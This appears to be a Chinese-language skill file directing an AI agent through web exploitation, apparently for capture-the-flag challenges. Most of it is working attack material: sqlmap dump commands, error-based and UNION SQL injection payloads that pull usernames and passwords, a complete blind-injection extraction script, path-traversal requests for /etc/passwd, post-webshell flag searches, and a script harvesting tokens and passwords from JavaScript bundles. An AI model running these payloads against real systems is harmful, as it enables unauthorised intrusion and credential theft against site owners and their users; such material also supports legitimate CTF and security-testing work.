---
name: web
description: Web 安全测试。覆盖 SQL 注入、XSS、SSRF、文件上传、反序列化、目录穿越、认证绕过等 Web 漏洞的侦察与利用。
---

# Web 安全攻击流程

## 侦察阶段
```bash
nmap -sV -sC $TARGET -p 1-10000
whatweb http://$TARGET
gobuster dir -u http://$TARGET -w /usr/share/wordlists/common.txt -x php,html,txt,bak
nikto -h http://$TARGET
```

## 漏洞探测优先级
1. 登录页面 → SQLi / 弱口令 / 认证绕过
2. 文件上传 → webshell / 绕过检测
3. 参数注入 → SQLi / SSRF / SSTI / LFI
4. API 端点 → 未授权访问 / IDOR
5. 框架指纹 → 已知 CVE

## SQL 注入
```bash
sqlmap -u "http://$TARGET/page?id=1" --batch --dbs
sqlmap -u "http://$TARGET/page?id=1" -D dbname --dump
```

## SQL 注入 · 大规模数据提取（重要：别用逐字符盲注）

当需要从数据库抽取大量数据（表名/列名/多行数据）时，**禁止**用"逐字符 boolean 盲注"
（get_len + get_str 每字符两次请求——又慢又贵，纯 pi 尤其要避免自己写这种循环）。

按目标响应行为选**最快的批量提取方式**，按优先级：

1. **报错注入（错误被回显时，MySQL）** — 一条查询输出整列：
```bash
# 爆表: 1' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))-- -
# 爆列: 1' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users')))-- -
# 取数(分块避免 extractvalue 32 字符回显上限): 1' AND extractvalue(1,concat(0x7e,substring((SELECT group_concat(username,0x7c,password) FROM users),1,30)))-- -
```
2. **UNION + group_concat（注入点可 union 时）** — 单查询整列：
`-1' UNION SELECT group_concat(username,0x7c,password) FROM users-- -`
3. **时间盲注/布尔盲注（只能此时）** — 用**二分法**（每字符 7 次请求，不是 2 次），并且**只定向提 `flag%`**，不要全表枚举：
```bash
# 二分+定向 flag：逐位二分 ASCII，一次查一字符（比逐字符遍历快 ~log2(128)/2）
python3 - <<'EOF'
import requests, sys
url="http://TARGET/page?id=1"
def oracle(cond):
    r=requests.get(url, params={"id": f"1' AND {cond}-- -"}, timeout=8)
    return b"true_marker" in r.content   # 换成实际页面差异特征
charset=[chr(i) for i in range(32,127)]
flag=""
for pos in range(1,80):
    lo,hi=0,len(charset)
    while lo<hi:
        mid=(lo+hi)//2
        if oracle(f"ascii(substring((SELECT col FROM t WHERE col LIKE 'flag{{%' LIMIT 1),{pos},1))>{ord(charset[mid])}"):
            lo=mid+1
        else:
            hi=mid
    if lo==0: break
    flag+=charset[lo-1]
    print(flag,flush=True)
    if flag.endswith("}"): break
EOF
```
4. **先 `LIKE 'flag{%'` 定向找 flag 列/行**，命中即停；没命中再考虑全量。

**通用纪律**：
- 拿到 flag 相关列后先 `WHERE col LIKE 'flag{%'` 一条查询直取，别枚举整个库。
- 报错/UNION 能出就绝不逐字符；只有纯盲注才用二分，且优先 `flag%` 定向。
- 一个注入点尝试 2-3 种方式各 1 次即可判断类型，不要反复空试。

## 文件包含 / 目录穿越
```bash
curl "http://$TARGET/read?file=../../../../etc/passwd"
curl "http://$TARGET/read?file=php://filter/convert.base64-encode/resource=index.php"
```

## 反序列化
- Java: ysoserial / JNDI-Injection-Exploit
- PHP: 构造 POP 链
- Python: pickle.loads 利用

## 关键规则
- 拿到 webshell 后立即找 flag: `find / -name "flag*" 2>/dev/null`
- 数据库里找 flag: `SELECT * FROM flag;` 或 `SHOW TABLES;`
- 环境变量: `env | grep -i flag`

## 前端 JS 挖掘（重要：一次提取，禁止反复 grep 同一批 JS）

Vue/React 打包产物是 API 端点的金矿，但 minified JS 又大又贵——**对同一文件换着正则反复 grep 是最浪费回合的行为**。正确姿势：

1. **一次性抓全**：把页面引用的 JS 并发下载到 /tmp/js/：
```bash
mkdir -p /tmp/js && cd /tmp/js && curl -s http://$TARGET/ -o index.html && \
for f in $(grep -oE '(src|href)="[^"]+\.js"' index.html | grep -oE '/[^"]+'); do curl -s -o "$(basename $f)" "http://$TARGET$f" & done; wait
```
2. **一个脚本提完所有信息**（端点/凭据/内网地址一次跑完，输出即结论）：
```bash
python3 - <<'EOF'
import re, glob
eps = set()
for fn in glob.glob('/tmp/js/*.js'):
    s = open(fn, errors='ignore').read()
    eps |= set(re.findall(r'["\'](/(?:api|v1|v2|admin|auth|user|upload|exec|task|file|download)[^"\'\s]{0,60})["\']', s))
    for m in re.findall(r'(?i)(?:secret|key|token|password|apikey)["\']?\s*[:=]\s*["\']([^"\']{4,60})["\']', s):
        print(f"[{fn}] 凭据类: {m}")
    for m in set(re.findall(r'https?://[\w.\-]+:\d+', s)):
        print(f"[{fn}] URL: {m}")
open('/tmp/js/endpoints.txt','w').write('\n'.join(sorted(eps)))
print('\n'.join('EP: ' + e for e in sorted(eps)))
EOF
```
3. 之后只对**提取出的可疑端点**逐个验证，端点列表已落盘 /tmp/js/endpoints.txt（跨会话可复用）。
4. 整个 JS 侦察 **2-3 个回合封顶**；若发现自己又在 grep 同一个文件，立刻停——回到第 2 步的脚本思路，把"想 grep 什么"写成一次性的提取规则。
